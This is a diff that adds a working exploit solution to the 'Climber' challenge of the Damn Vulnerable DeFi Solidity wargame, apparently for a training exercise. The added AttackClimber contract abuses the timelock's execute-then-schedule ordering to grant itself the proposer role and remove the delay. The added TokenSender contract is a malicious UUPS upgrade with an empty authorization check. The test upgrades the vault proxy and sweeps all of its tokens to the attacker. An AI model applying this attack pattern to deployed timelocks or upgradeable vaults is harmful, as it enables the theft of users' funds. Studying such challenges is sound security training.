@@ -2,12 +2,81 @@
 pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
+import {AccessControl} from "openzeppelin-contracts/access/AccessControl.sol";
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
+import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import "forge-std/Test.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
 import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";
+
+contract AttackClimber {
+    ClimberTimelock internal climberTimelock;
+    address internal attacker;
+
+    constructor(ClimberTimelock _climberTimelock, address _attacker) {
+        climberTimelock = _climberTimelock;
+        attacker = _attacker;
+    }
+
+    function attack() external {
+        address[] memory targets = new address[](4);
+        targets[0] = address(climberTimelock);
+        targets[1] = address(climberTimelock);
+        targets[2] = address(climberTimelock);
+        targets[3] = address(this);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+        dataElements[0] = abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this));
+        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), attacker);
+        dataElements[2] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
+        dataElements[3] = abi.encodeWithSelector(AttackClimber.scheduleTasks.selector);
+        climberTimelock.execute(
+            targets,
+            values,
+            dataElements,
+            bytes32(0x0)
+        );
+    }
+
+    function scheduleTasks() external {
+        address[] memory targets = new address[](4);
+        targets[0] = address(climberTimelock);
+        targets[1] = address(climberTimelock);
+        targets[2] = address(climberTimelock);
+        targets[3] = address(this);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory dataElements = new bytes[](4);
+        dataElements[0] = abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this));
+        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), attacker);
+        dataElements[2] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
+        dataElements[3] = abi.encodeWithSelector(AttackClimber.scheduleTasks.selector);
+        climberTimelock.schedule(
+            targets,
+            values,
+            dataElements,
+            bytes32(0x0)
+        );
+    }
+
+}
+
+contract TokenSender is UUPSUpgradeable {
+    function sweepFunds(address tokenAddress, address toAddress) external {
+        IERC20 token = IERC20(tokenAddress);
+        require(
+            token.transfer(toAddress, token.balanceOf(address(this))),
+            "Transfer failed"
+        );
+    }
+
+    function _authorizeUpgrade(address newImplementation)
+        internal
+        override
+    {}
+}
 
 contract Climber is Test {
     uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;
@@ -88,7 +157,28 @@ contract Climber is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        
+        // Exploit timelock - make attacker a proposer and remove delay
+        AttackClimber attackingContract = new AttackClimber(climberTimelock, attacker);
+        attackingContract.attack();
 
+        // Propose new implementation that allows attacker to drain tokens
+        TokenSender tokenSenderImplementation = new TokenSender();
+        address[] memory targets = new address[](1);
+        targets[0] = address(climberVaultProxy);
+        uint256[] memory values = new uint256[](1);
+        bytes[] memory dataElements = new bytes[](1);
+        dataElements[0] = abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(tokenSenderImplementation));
+
+        climberTimelock.schedule(targets, values, dataElements, 0x0);
+        climberTimelock.execute(targets, values, dataElements, 0x0);
+
+        // Now, take the tokens.
+        TokenSender compromisedVault = TokenSender(address(climberVaultProxy));
+        compromisedVault.sweepFunds(address(dvt), attacker);
+
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
